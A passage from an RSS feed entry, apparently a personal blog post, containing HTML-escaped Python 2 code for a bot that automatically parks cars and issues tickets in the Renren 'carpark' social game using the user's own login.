&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print ret<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url='http://carpark.renren.com/getCarParkMainFrame.do'<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;ret=self.req(url)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;pids=re.findall('\'\{\"id\"\:(.*)\}',ret)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if len(pids)&gt;0:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.pid=pids[0]<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;else:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print ret.encode('utf-8')<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;'''获取好友列表<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;'''<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def listFriends(self):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url='http://carpark.renren.com/getFriendsCarList.do'<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.friends=json.read(self.req(url))<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;'''获取某个好友信息<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;'''<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def showFriend(self,fid):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url='http://carpark.renren.com/ajax_car_park_get_next_page.f?pid=%s' % fid<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return json.read(self.req(url))<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;'''获取个人汽车列表<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;'''<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def getMyCar(self):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url='http://carpark.renren.com/ajaxGetMyCar.f'<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.mycar=json.read(self.req(url))<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;'''贴条<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;'''<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def harvest(self,pid):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url='http://carpark.renren.com/ajax_car_park_remove_car.do'<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;body={'pid':pid}<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return json.read(self.req(url,body))<br><br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;'''停车 把car听到friend的第pid个停车场<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;'''<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def stopCar(self,car,friend,pid):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url='http://carpark.renren.com/ajaxPreAddCar.do'<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;body={'ownerId':self.pid,'parkIdTo':pid,'parkOwnerIdTo':friend['userid'],<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;'parkOwnerNameTo':friend['user_name'].encode('utf-8')}<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;cars=json.read(self.req(url,body))['carList']<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;for x in cars:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if x['carId']==car['car_id']:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;pidFrom=x['parkIdFrom']<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;break<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url='http://carpark.renren.com/ajaxAddCar.do'<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if car.has_key('user_id'):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;parkOwnerIdFrom=car['user_id']<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;parkOwnerNameFrom=car['user_name'].encode('utf-8')<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;else:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;parkOwnerIdFrom=0<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;parkOwnerNameFrom=''<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;body = {'carId':car['car_id'],'carName':car['car_name'].encode('utf-8'),'free':0,<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;'on<wbr>lyCarId':car['uc_id'],'ownerId':self.pid,<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;'parkIdFrom':pidFrom,'parkIdTo':pid,<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;'parkOwnerIdFrom':parkOwnerIdFrom, 'parkOwnerIdTo':friend['userid'],<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;'parkOwnerNameFrom': parkOwnerNameFrom,<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;'parkOwnerNameTo': friend['user_name'].encode('utf-8')}<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;raw=self.req(url,body)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print raw<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if raw=='timeNotEnough':<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return raw<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;elif raw=='err':<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return False<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;elif raw=='parked':<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return False<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;else:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print raw<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return True<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;'''找到空位并停车<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;'''<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def findAndStop(self,car):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;for friend in self.friends['friends']:#对每个好友<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;#如果停车场满，不能停<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if friend['full'] == 'f':<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;continue<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;#同一个好友的不同停车场，不能停 <br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if car.has_key('user_id') and friend['userid'] == car['user_id']:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;continue<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;fpark=self.showFriend(friend['userid']) #获取该好友详情<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;pid = -1<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;for park in fpark['parklist']:#该好友的每个停车场<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;pid += 1<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if park['parked']==0 and park['free'] == 0:#空闲而且非免费<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if self.stopCar(car,friend,pid):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return True<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;else:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return False<br><br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;'''查看自己的汽车，<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;如果有空闲的，则找到空闲车位并停放<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; 查看自己的停车场<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;如果有可以贴条的，则贴条<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;'''<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def run(self):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.getMyCar()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.listFriends()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if self.autoPark: #自动停车<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;for mycar in self.mycar['carlist']: #每辆汽车<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if mycar.has_key('money') and int(mycar['money'])&lt;self.mycar['maxGain']: <br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;pass<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;else: #正在寻找车位&nbsp; or 钱已经挣满了<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if self.findAndStop(mycar)==True:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print 'Stop car'.encode('utf-8')<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;else:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return False<br><br><br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if self.autoPaste: #自动贴条<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;myplace = self.showFriend(self.pid)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;pid = -1<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;for park in myplace['parklist']: #每个停车场<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;pid += 1<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if park['parked'] == 1:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if park['money'] in [10000,15000,18000] or park['money'] &gt; 18000:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.harvest(pid)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print 'Paste'.encode('utf-8')<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return True<br>if __name__=='__main__':<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;park = Park()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;park.login('校内账户名','校内密码')<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;park.listFriends()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;park.getMyCar()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;while True:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;while not park.run():<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print 'Park failed'<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;pass<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print u'%s下次运行60分钟后'.encode('utf-8') % time.ctime()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;time.sleep(60*60)<br><br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Network</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372009825211129/</guid>
    </item>
  </channel>
</rss>
